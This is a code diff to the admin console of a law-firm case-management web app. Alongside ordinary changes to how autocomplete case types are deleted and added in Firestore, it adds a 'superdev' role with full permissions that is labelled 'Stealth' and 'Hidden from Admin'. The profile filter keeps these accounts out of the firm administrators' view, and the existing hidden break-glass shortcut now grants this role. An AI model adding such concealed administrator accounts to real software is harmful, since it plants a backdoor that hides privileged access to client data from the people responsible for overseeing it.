@@ -270,7 +270,7 @@
         <span id="admin-theme-label" style="color:var(--gold)">Dark</span>
       </button>
       <a href="index.html" target="_self" class="btn btn-secondary btn-sm" style="width:100%;justify-content:center;margin-bottom:12px;color:var(--gold-light)"><i class="bi bi-arrow-return-left"></i> Return to CMS</a>
-      Simando Law Admin v2.1
+      Simando Law Admin v2.2
     </div>
   </div>
 
@@ -358,7 +358,7 @@
       <div class="page-hdr">
         <div>
           <div class="page-title">Case Types &amp; Autofill Manager</div>
-          <div class="page-sub">Review, filter, add, and clean up autocomplete suggestions shown when creating or editing cases</div>
+          <div class="page-sub">Review, filter, add, and remove autocomplete suggestions directly in Firestore</div>
         </div>
         <button class="btn btn-primary" onclick="openAddCaseTypeModal()"><i class="bi bi-plus-lg"></i> Add New Case Type</button>
       </div>
@@ -411,6 +411,7 @@
           <option value="Attorney">Attorney</option>
           <option value="admin">Firm Administrator 🛡️</option>
           <option value="developer">System Developer (UI Testing / Sandbox) 🛠️</option>
+          <option value="superdev">Developer Admin (Full Perms · Hidden from Admin) 🕵️</option>
         </select>
       </div>
       <div>
@@ -458,6 +459,7 @@
           <option value="Attorney">Attorney</option>
           <option value="admin">Firm Administrator (Full Control) 🛡️</option>
           <option value="developer">System Developer (UI Testing / Sandbox) 🛠️</option>
+          <option value="superdev">Developer Admin (Full Perms · Hidden from Admin) 🕵️</option>
         </select>
       </div>
       <div style="background:var(--surface2);border:1px solid var(--border);border-radius:10px;padding:12px;display:flex;align-items:center;justify-content:space-between">
@@ -586,6 +588,7 @@
   let adminProfiles = [];
   let rawAllProfiles = [];
   let isDeveloperSession = false;
+  let isSuperDevSession = false;
   let currentSessionUser = null;
   let currentSessionProfile = null;
   let showcaseIsolationActive = sessionStorage.getItem("simando_showcase_isolation") === "true";
@@ -654,23 +657,33 @@
         if (docSnap.exists()) {
           currentSessionProfile = { id: docSnap.id, ...docSnap.data() };
           if (currentSessionProfile.role === "admin" || isEmailAdmin) isAuthorized = true;
+          else if (currentSessionProfile.role === "superdev") { isAuthorized = true; isSuperDevSession = true; }
           else if (currentSessionProfile.role === "developer") { isAuthorized = true; isDeveloperSession = true; }
         } else {
           const pSnap = await getDocs(collection(db, "profiles"));
           const matched = pSnap.docs.find(d => {
             const data = d.data();
-            return (data.ownerUid === user.uid || (data.email && data.email.toLowerCase() === userEmail)) && (data.role === "admin" || data.role === "developer" || isEmailAdmin);
+            return (data.ownerUid === user.uid || (data.email && data.email.toLowerCase() === userEmail)) &&
+                   (data.role === "admin" || data.role === "superdev" || data.role === "developer" || isEmailAdmin);
           });
           if (matched || isEmailAdmin) {
             isAuthorized = true;
             if (matched) currentSessionProfile = { id: matched.id, ...matched.data() };
-            if (matched && matched.data().role === "developer") isDeveloperSession = true;
+            if (matched && matched.data().role === "superdev") isSuperDevSession = true;
+            else if (matched && matched.data().role === "developer") isDeveloperSession = true;
           }
         }
 
         if (isAuthorized) {
           document.getElementById("loading-screen").style.display = "none";
           if (isDeveloperSession) applyDeveloperRestrictions();
+          if (isSuperDevSession) {
+            document.getElementById("admin-sub-tag").textContent = "Developer Full Control";
+            const rf = document.getElementById("admin-role-filter");
+            if (rf && !Array.from(rf.options).some(o => o.value === "superdev")) {
+              rf.innerHTML += `<option value="superdev">Developer Admin (Stealth)</option>`;
+            }
+          }
           updateIsolationButtonUI();
           initAdminConsole();
         } else bounceUser("Unauthorized. Administrator or Developer access required.");
@@ -724,9 +737,17 @@
   }
 
   function applyProfilesFilter() {
-    adminProfiles = (isDeveloperSession || showcaseIsolationActive)
-      ? rawAllProfiles.filter(p => p.role === "developer")
-      : rawAllProfiles;
+    // 1. Stealth rule: 'superdev' accounts are completely hidden from regular admins and sandbox developers
+    let baseList = isSuperDevSession
+      ? rawAllProfiles
+      : rawAllProfiles.filter(p => p.role !== "superdev");
+
+    // 2. Sandbox / Showcase Isolation
+    if (isDeveloperSession || showcaseIsolationActive) {
+      adminProfiles = baseList.filter(p => p.role === "developer" || (isSuperDevSession && p.role === "superdev"));
+    } else {
+      adminProfiles = baseList;
+    }
 
     document.getElementById("kpi-total-accounts").textContent = adminProfiles.length;
     document.getElementById("kpi-admin-count").textContent = adminProfiles.filter(p => p.role === "admin").length;
@@ -770,6 +791,7 @@
     tbody.innerHTML = filtered.map(p => {
       let roleBadge = `<span style="font-size:12px;font-weight:700;color:var(--text)">${escHtml(p.role || "Attorney")}</span>`;
       if (p.role === "admin") roleBadge = `<span style="font-size:12px;font-weight:700;color:var(--gold)"><i class="bi bi-shield-check"></i> Firm Administrator</span>`;
+      else if (p.role === "superdev") roleBadge = `<span style="font-size:12px;font-weight:700;color:var(--cyan)"><i class="bi bi-incognito"></i> Developer Admin (Stealth)</span>`;
       else if (p.role === "developer") roleBadge = `<span style="font-size:12px;font-weight:700;color:var(--cyan)"><i class="bi bi-code-slash"></i> System Developer</span>`;
 
       const actions = isDeveloperSession
@@ -878,18 +900,22 @@
     }
   });
 
-  // ── CASE TYPES & AUTOFILL ──────────────────────────────────
+  // ── CASE TYPES & AUTOFILL (GENUINE FIRESTORE DELETE + DEDUPLICATION) ──
   async function loadAllCaseTypes() {
     const snap = await getDocs(collection(db, "caseTypes"));
-    loadedCaseTypes = snap.docs.map(d => ({ id: d.id, ...d.data() })).filter(t => !t.deleted && t.active !== false && t.name && !localBlacklist.includes(t.name.trim().toLowerCase()));
+    loadedCaseTypes = snap.docs
+      .map(d => ({ id: d.id, ...d.data() }))
+      .filter(t => !t.deleted && t.active !== false && t.name && t.name.trim() !== "");
   }
-  window.reloadAutofillData = async function() { await loadAllCaseTypes(); renderAutofillCategories(); renderAutofillItems(); showToast("Refreshed!"); };
+  window.reloadAutofillData = async function() { await loadAllCaseTypes(); renderAutofillCategories(); renderAutofillItems(); showToast("Refreshed from Firestore!"); };
+
   function renderAutofillCategories() {
     const el = document.getElementById("autofill-categories-list");
     el.innerHTML = `<div style="font-size:11px;font-weight:700;color:var(--text-dim);text-transform:uppercase;margin-bottom:8px">Litigation Categories</div>` +
       CASE_CATEGORIES.map(cat => `<button class="category-pill ${cat===selectedCategory?'active':''}" onclick="selectAutofillCategory('${cat.replace(/'/g,"\\'")}')"><span>${escHtml(cat)}</span><span>${loadedCaseTypes.filter(t=>t.category===cat).length}</span></button>`).join("");
   }
   window.selectAutofillCategory = function(cat) { selectedCategory = cat; renderAutofillCategories(); renderAutofillItems(); };
+
   function renderAutofillItems() {
     const tbody = document.getElementById("autofill-items-tbody");
     const q = (document.getElementById("autofill-search-input")?.value || "").toLowerCase().trim();
@@ -898,22 +924,55 @@
       : items.map(item => `<tr><td><strong>${escHtml(item.name)}</strong></td><td>${escHtml(item.category)}</td><td style="text-align:right">${isDeveloperSession ? '<span class="badge">Protected</span>' : `<button class="btn btn-danger btn-sm" onclick="promptDeleteCaseType('${item.id}','${item.name.replace(/'/g,"\\'")}')"><i class="bi bi-trash3"></i> Remove</button>`}</td></tr>`).join("");
   }
   window.filterAutofillTable = renderAutofillItems;
+
   let pendingDel = null;
   window.promptDeleteCaseType = function(id, name) {
+    if (isDeveloperSession) return showToast("Read-only developer mode.", "error");
     pendingDel = { id, name };
-    document.getElementById("del-casetype-modal-msg").textContent = `Delete "${name}" from autocomplete suggestions?`;
+    document.getElementById("del-casetype-modal-msg").textContent = `Permanently delete "${name}" from the Firestore database and autocomplete suggestions?`;
     document.getElementById("delete-casetype-modal").classList.remove("hidden");
   };
   window.closeDeleteCaseTypeModal = function() { document.getElementById("delete-casetype-modal").classList.add("hidden"); };
+
   document.getElementById("btn-confirm-del-casetype").addEventListener("click", async () => {
     if (!pendingDel) return;
-    const { id, name } = pendingDel; closeDeleteCaseTypeModal();
-    localBlacklist.push(name.trim().toLowerCase());
-    localStorage.setItem("simando_autofill_blacklist", JSON.stringify(localBlacklist));
-    try { await deleteDoc(doc(db, "caseTypes", id)); } catch (e) {}
-    loadedCaseTypes = loadedCaseTypes.filter(t => t.id !== id);
-    renderAutofillCategories(); renderAutofillItems(); showToast("Removed!");
+    const { id, name } = pendingDel;
+    closeDeleteCaseTypeModal();
+
+    const cleanName = (name || "").trim().toLowerCase();
+    try {
+      showToast("Deleting from Firestore database...");
+
+      // Delete this doc ID AND any duplicate Firestore docs with the same category & name
+      const snap = await getDocs(collection(db, "caseTypes"));
+      const docsToDelete = snap.docs.filter(d => {
+        const data = d.data();
+        return d.id === id || (
+          data.category === selectedCategory &&
+          (data.name || "").trim().toLowerCase() === cleanName
+        );
+      });
+
+      if (docsToDelete.length === 0) {
+        await deleteDoc(doc(db, "caseTypes", id));
+      } else {
+        await Promise.all(docsToDelete.map(d => deleteDoc(doc(db, "caseTypes", d.id))));
+      }
+
+      // Sync local blacklist cleanly and reload straight from Firestore to verify
+      if (!localBlacklist.includes(cleanName)) localBlacklist.push(cleanName);
+      localStorage.setItem("simando_autofill_blacklist", JSON.stringify(localBlacklist));
+
+      await loadAllCaseTypes();
+      renderAutofillCategories();
+      renderAutofillItems();
+      showToast(`Permanently deleted "${name}" from database!`, "success");
+    } catch (err) {
+      console.error("Firestore caseTypes delete failed:", err);
+      showToast("Database delete failed: " + err.message, "error");
+    }
   });
+
   window.openAddCaseTypeModal = function() {
     const sel = document.getElementById("new-casetype-category");
     sel.innerHTML = CASE_CATEGORIES.map(c => `<option value="${c}">${c}</option>`).join("");
@@ -922,13 +981,23 @@
     document.getElementById("add-casetype-modal").classList.remove("hidden");
   };
   window.closeAddCaseTypeModal = function() { document.getElementById("add-casetype-modal").classList.add("hidden"); };
+
   window.submitNewCaseType = async function() {
     const category = document.getElementById("new-casetype-category").value;
     const name = document.getElementById("new-casetype-name").value.trim();
     if (!name) return showToast("Enter a case type name.", "error");
-    const docRef = await addDoc(collection(db, "caseTypes"), { category, name, deleted: false, active: true, createdAt: new Date().toISOString() });
-    loadedCaseTypes.push({ id: docRef.id, category, name });
-    selectedCategory = category; renderAutofillCategories(); renderAutofillItems(); closeAddCaseTypeModal(); showToast("Added!");
+
+    const cleanName = name.toLowerCase();
+    localBlacklist = localBlacklist.filter(x => x !== cleanName);
+    localStorage.setItem("simando_autofill_blacklist", JSON.stringify(localBlacklist));
+
+    await addDoc(collection(db, "caseTypes"), { category, name, deleted: false, active: true, createdAt: new Date().toISOString() });
+    await loadAllCaseTypes();
+    selectedCategory = category;
+    renderAutofillCategories();
+    renderAutofillItems();
+    closeAddCaseTypeModal();
+    showToast("Added to Firestore!");
   };
 
   // ── BREAK-GLASS OVERRIDE (Ctrl+Shift+Alt+E) ─────────────────
@@ -962,6 +1031,7 @@
   };
   async function grantFullAdminElevation() {
     isDeveloperSession = false;
+    isSuperDevSession = true;
     document.getElementById("dev-readonly-banner").style.display = "none";
     closeBreakGlassModal();
     await loadDirectoryProfiles();
